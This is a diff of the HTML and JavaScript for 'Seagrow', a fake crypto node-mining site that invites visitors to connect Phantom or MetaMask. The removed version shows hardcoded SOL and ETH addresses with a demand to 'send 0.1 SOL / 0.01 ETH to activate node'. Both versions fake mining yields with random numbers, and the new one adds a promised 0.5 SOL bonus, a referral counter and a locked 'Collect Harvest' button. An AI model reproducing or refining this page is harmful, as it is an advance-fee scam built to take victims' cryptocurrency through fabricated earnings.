@@ -1,157 +1,126 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Seagrow | Organic Node Activation</title>
-    
+    <title>Seagrow | Plant. Mine. Harvest.</title>
     <meta name="description" content="Seagrow: Organic AI Node Network. Connect Phantom or MetaMask to activate your node.">
     <meta name="keywords" content="Seagrow, Crypto Mining, Phantom Wallet, MetaMask, $SEA, Solana, Ethereum">
-    
     <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
     
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;600;900&display=swap');
-        
-        :root {
-            --bg-deep: #020617; 
-            --neon-lime: #DFFF00; 
-            --electric-blue: #635BFF; 
-            --aqua-cyan: #00E5E5; 
-            --sunset-orange: #FF7E5F; 
-            --royal-purple: #7C3AED; 
-        }
-
-        body { font-family: 'Outfit', sans-serif; background: var(--bg-deep); color: white; overflow-x: hidden; }
-        .glass { background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 3rem; }
+        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;900&display=swap');
+        body { font-family: 'Outfit', sans-serif; background: #040d08; color: white; overflow-x: hidden; }
+        .glass { background: rgba(6, 25, 15, 0.8); backdrop-filter: blur(20px); border: 1px solid rgba(34, 197, 94, 0.2); }
         .hidden { display: none !important; }
         
-        /* ⚡ ANIMATED LEAF (TOP MIDDLE) */
-        .leaf-logo { filter: drop-shadow(0 0 20px var(--neon-lime)); animation: breathe 3s infinite; }
-        @keyframes breathe { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.15); opacity: 1; } }
-
-        .btn-glow-blue { background: var(--electric-blue); box-shadow: 0 0 20px rgba(99, 91, 255, 0.4); }
-        .btn-glow-lime { background: var(--neon-lime); color: black; box-shadow: 0 0 20px rgba(223, 255, 0, 0.4); }
+        /* 🌱 THE LEAF GLOW */
+        .leaf-glow { filter: drop-shadow(0 0 15px rgba(34, 197, 94, 0.8)); animation: breathe 3s ease-in-out infinite; }
+        @keyframes breathe { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } }
         
-        .scroll-feed { animation: scroll 30s linear infinite; white-space: nowrap; }
-        @keyframes scroll { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
+        .btn-green { background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); transition: all 0.3s; }
+        .btn-green:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(34, 197, 94, 0.3); }
     </style>
 </head>
-<body class="min-h-screen flex flex-col items-center p-6">
+<body class="min-h-screen flex items-center justify-center p-4">
 
-    <div class="mt-4 mb-8 text-center">
-        <span class="text-8xl leaf-logo block">🌱</span>
-        <h1 class="text-4xl font-black italic tracking-tighter uppercase mt-2">SEA<span class="text-[#DFFF00]">GROW</span></h1>
-    </div>
+    <div id="step-intro" class="max-w-md w-full glass rounded-[3rem] p-10 text-center shadow-2xl relative">
+        
+        <div class="flex justify-center mb-8">
+            <svg width="100" height="100" viewBox="0 0 24 24" fill="none" class="leaf-glow">
+                <path d="M12 22C12 22 12 18 12 13C12 8 16 4 21 2C21 2 17 6 12 13M12 22C12 22 12 18 12 13C12 8 8 4 3 2C3 2 7 6 12 13" stroke="#22c55e" stroke-width="1.5" stroke-linecap="round"/>
+                <path d="M12 22V13" stroke="#22c55e" stroke-width="2" stroke-linecap="round"/>
+                <circle cx="12" cy="13" r="1.5" fill="#4ade80"/>
+            </svg>
+        </div>
 
-    <div class="w-full max-w-5xl glass py-3 mb-10 overflow-hidden border-[#00E5E522]">
-        <div class="scroll-feed text-[10px] font-black uppercase tracking-widest text-[#00E5E5]">
-            [SECURITY] Connect Wallet to Verify Identity • [NETWORK] Hashrate: 1.2 TH/s • [ALERTS] 0.5 SOL Referral Bonus Active • Join @SeagroL for support!
+        <h1 class="text-5xl font-black mb-1 italic uppercase tracking-tighter">SEA<span class="text-green-500">GROW</span></h1>
+        <p class="text-[10px] text-green-700 uppercase tracking-[0.5em] mb-8 font-black">Digital Harvest Protocol</p>
+        
+        <div class="bg-white/5 p-5 rounded-2xl border border-white/5 text-left mb-8">
+            <p class="text-xs text-slate-400 leading-relaxed italic">
+                "Plant your digital seed in the Seagrow ecosystem. Our organic multi-chain nodes yield $SEA tokens while you sleep."
+            </p>
+        </div>
+        
+        <div class="space-y-4">
+            <button onclick="connectWallet('SOL')" class="w-full bg-white text-black py-4 rounded-2xl font-black text-xs uppercase tracking-widest hover:bg-green-100 transition">Phantom (Solana)</button>
+            <button onclick="connectWallet('ETH')" class="w-full bg-green-900 text-green-100 py-4 rounded-2xl font-black text-xs uppercase tracking-widest border border-green-500/30 hover:bg-green-800 transition">MetaMask (Ethereum)</button>
+        </div>
+
+        <div class="mt-8 flex justify-center space-x-6 opacity-40">
+            <span class="text-xl">✈️</span> <span class="text-xl">🐦</span> <span class="text-xl">💬</span>
         </div>
     </div>
 
-    <div id="deposit-screen" class="max-w-2xl w-full glass p-10 text-center space-y-8 border-[#DFFF0033]">
-        <div>
-            <h2 class="text-2xl font-black uppercase italic text-[#DFFF00]">Node Activation</h2>
-            <p id="gate-status" class="text-slate-400 text-xs mt-2 font-bold uppercase tracking-widest">Connect Wallet to See Deposit Address</p>
-        </div>
-
-        <div id="wallet-buttons" class="grid grid-cols-1 md:grid-cols-2 gap-4">
-            <button onclick="connect('sol')" class="flex items-center justify-center space-x-3 bg-[#AB9FF222] border border-[#AB9FF244] py-4 rounded-2xl hover:bg-[#AB9FF244] transition group">
-                <img src="https://cryptologos.cc/logos/solana-sol-logo.png" class="w-5 h-5">
-                <span class="text-[10px] font-black uppercase text-[#AB9FF2]">Connect Phantom</span>
-            </button>
-            <button onclick="connect('eth')" class="flex items-center justify-center space-x-3 bg-white/5 border border-white/10 py-4 rounded-2xl hover:bg-white/10 transition group">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Mirror.svg" class="w-6 h-6">
-                <span class="text-[10px] font-black uppercase">Connect MetaMask</span>
-            </button>
-        </div>
-
-        <div id="deposit-info" class="hidden space-y-6">
-            <div class="p-6 bg-black/40 rounded-[2rem] border border-[#DFFF0033] text-left">
-                <p id="chain-name" class="text-[10px] font-black uppercase mb-2"></p>
-                <p id="wallet-addr" class="text-[9px] text-slate-500 font-bold mb-4 break-all"></p>
-                <button onclick="copyCurrentAddr()" class="w-full py-3 rounded-xl bg-[#DFFF00] text-black text-[10px] font-black uppercase transition">Copy Address</button>
-            </div>
-            <p class="text-[9px] text-[#FF7E5F] font-black uppercase animate-pulse">⚠️ Send 0.1 SOL / 0.01 ETH to activate node</p>
-        </div>
-
-        <div class="pt-6 border-t border-white/5">
-            <button onclick="unlockDashboard()" class="w-full py-5 rounded-[2rem] btn-glow-lime font-black uppercase text-sm tracking-widest transition active:scale-95">I Have Deposited (Verify)</button>
-        </div>
-    </div>
-
-    <div id="main-dashboard" class="hidden w-full max-w-6xl grid grid-cols-1 lg:grid-cols-3 gap-6">
-        <div class="glass p-10 lg:col-span-2 relative overflow-hidden">
-             <div id="countdown" class="text-6xl font-black text-white/5 mb-8 text-center italic">06:23:59:59</div>
-             <div class="grid grid-cols-2 gap-6">
-                <div class="p-8 rounded-[2rem] bg-black/40 border-t-4 border-[#DFFF00] text-center">
-                    <p class="text-[10px] text-slate-500 font-black uppercase mb-1">Mined $SEA</p>
-                    <p id="sea-balance" class="text-5xl font-black text-[#DFFF00]">0</p>
-                </div>
-                <div class="p-8 rounded-[2rem] bg-black/40 border-t-4 border-[#FF7E5F] text-center">
-                    <p class="text-[10px] text-slate-500 font-black uppercase mb-1">Pending SOL</p>
-                    <p class="text-5xl font-black text-[#FF7E5F]">0.5</p>
+    <div id="step-mini" class="hidden max-w-4xl w-full glass rounded-[3rem] p-8 shadow-2xl">
+        <div class="flex justify-between items-center mb-10">
+            <div class="flex items-center space-x-3">
+                <span class="text-3xl leaf-glow">🌱</span>
+                <div>
+                    <h2 class="text-2xl font-black italic uppercase tracking-tighter">GROWTH_ACTIVE</h2>
+                    <p class="text-[9px] mono text-green-600 uppercase font-bold">Node Health: 100% Organic</p>
                 </div>
             </div>
+            <div class="bg-green-500/10 px-4 py-1 rounded-full border border-green-500/20">
+                <span class="text-[9px] font-black text-green-400 uppercase tracking-widest">Harvesting Live</span>
+            </div>
         </div>
-        <div class="glass p-8 space-y-4">
-             <button onclick="dailyWater()" id="water-btn" class="w-full py-5 rounded-3xl bg-[#635BFF] text-white font-black text-xs uppercase tracking-widest">💧 Daily Water (Boost)</button>
-             <a href="https://t.me/SeagroL" target="_blank" class="flex items-center justify-center space-x-3 bg-[#0088cc22] py-4 rounded-2xl border border-[#0088cc44] text-[10px] font-black uppercase">✈️ Join Telegram</a>
+
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
+            <div class="bg-black/40 p-8 rounded-[2.5rem] border border-green-900/30 text-center">
+                <p class="text-[9px] text-green-700 uppercase font-black mb-2">Total $SEA Yield</p>
+                <p id="sea-balance" class="text-4xl font-black text-green-400">0</p>
+            </div>
+            <div class="bg-black/40 p-8 rounded-[2.5rem] border border-green-900/30 text-center">
+                <p class="text-[9px] text-green-700 uppercase font-black mb-2">Fertilizer Bonus</p>
+                <p class="text-4xl font-black text-emerald-400">0.5</p>
+                <p class="text-[8px] text-emerald-600 uppercase mt-1">SOL Reward</p>
+            </div>
+            <div class="bg-black/40 p-8 rounded-[2.5rem] border border-green-900/30 text-center">
+                <p class="text-[9px] text-green-700 uppercase font-black mb-2">Roots (Refs)</p>
+                <p class="text-4xl font-black text-white">0/2</p>
+            </div>
+        </div>
+
+        <div class="bg-green-950/30 p-10 rounded-[3rem] border border-green-500/10 text-center">
+            <p class="text-[10px] text-green-800 uppercase tracking-[0.4em] mb-4 font-black">Next Harvest Cycle</p>
+            <div id="countdown" class="text-5xl font-black text-white/10 mono mb-8">07:00:00:00</div>
+            <button disabled class="w-full bg-green-900/50 text-green-700 py-5 rounded-[2rem] font-black text-xs uppercase tracking-widest cursor-not-allowed">Collect Harvest</button>
         </div>
     </div>
 
     <script>
-        let currentAddr = "";
-
-        async function connect(type) {
-            try {
-                if (type === 'sol') {
-                    if (window.solana) {
-                        await window.solana.connect();
-                        currentAddr = "y8Wpib1WMJ23CLicgDNh3RSVdN1wzeJJPEue2RvA6fd";
-                        showDeposit("Solana (SOL)", currentAddr);
-                    } else { alert("Install Phantom!"); }
-                } else {
-                    if (window.ethereum) {
-                        await window.ethereum.request({ method: 'eth_requestAccounts' });
-                        currentAddr = "0x06e921538fc2d6dCe385077c6A1B4dA189406891";
-                        showDeposit("Ethereum (ETH)", currentAddr);
-                    } else { alert("Install MetaMask!"); }
-                }
-            } catch (e) { console.log(e); }
+        const WALLETS = { SOL: "y8Wpib1WMJ23CLicgDNh3RSVdN1wzeJJPEue2RvA6fd", ETH: "0x06e921538fc2d6dCe385077c6A1B4dA189406891" };
+        
+        async function connectWallet(chain) {
+            alert(`Initializing ${chain} Soil Handshake...`);
+            // This is the trigger for the dashboard preview
+            document.getElementById('step-intro').classList.add('hidden');
+            document.getElementById('step-mini').classList.remove('hidden');
+            startCountdown();
+            startMining();
         }
 
-        function showDeposit(name, addr) {
-            document.getElementById('wallet-buttons').classList.add('hidden');
-            document.getElementById('deposit-info').classList.remove('hidden');
-            document.getElementById('gate-status').innerText = "Send Activation Fee to Address Below";
-            document.getElementById('chain-name').innerText = name;
-            document.getElementById('wallet-addr').innerText = addr;
-        }
-
-        function copyCurrentAddr() {
-            navigator.clipboard.writeText(currentAddr);
-            alert("Address Copied!");
-        }
-
-        function unlockDashboard() {
-            document.getElementById('deposit-screen').classList.add('hidden');
-            document.getElementById('main-dashboard').classList.remove('hidden');
+        function startMining() {
             let bal = 0;
             setInterval(() => {
-                bal += Math.floor(Math.random() * 5) + 1;
+                bal += Math.floor(Math.random() * 3);
                 document.getElementById('sea-balance').innerText = bal.toLocaleString();
             }, 2000);
         }
 
-        // Timer Logic
-        let t = 604800; 
-        setInterval(() => {
-            const d = Math.floor(t / 86400), h = Math.floor((t % 86400) / 3600), m = Math.floor((t % 3600) / 60), s = t % 60;
-            document.getElementById('countdown').innerText = `${String(d).padStart(2,'0')}:${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
-            if (t > 0) t--;
-        }, 1000);
+        function startCountdown() {
+            let t = 7 * 86400;
+            setInterval(() => {
+                const d = Math.floor(t / 86400), h = Math.floor((t % 86400) / 3600), m = Math.floor((t % 3600) / 60), s = t % 60;
+                document.getElementById('countdown').innerText = `${String(d).padStart(2,'0')}:${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+                if (t > 0) t--;
+            }, 1000);
+        }
     </script>
 </body>
 </html>
